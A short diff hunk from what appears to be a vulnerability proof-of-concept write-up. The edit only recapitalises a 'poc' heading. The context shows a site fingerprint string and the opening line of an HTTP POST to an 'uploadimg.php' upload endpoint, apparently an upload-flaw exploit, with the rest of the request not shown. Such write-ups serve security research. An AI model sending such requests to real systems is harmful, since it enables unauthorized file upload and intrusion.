@@ -8,7 +8,7 @@
 body="/images/logo/logo140x38.png"
 ```
 
-## poc
+## POC
 
 ```yaml
 POST /plugins/upload/uploadimg.php?fp=upimg HTTP/1.1
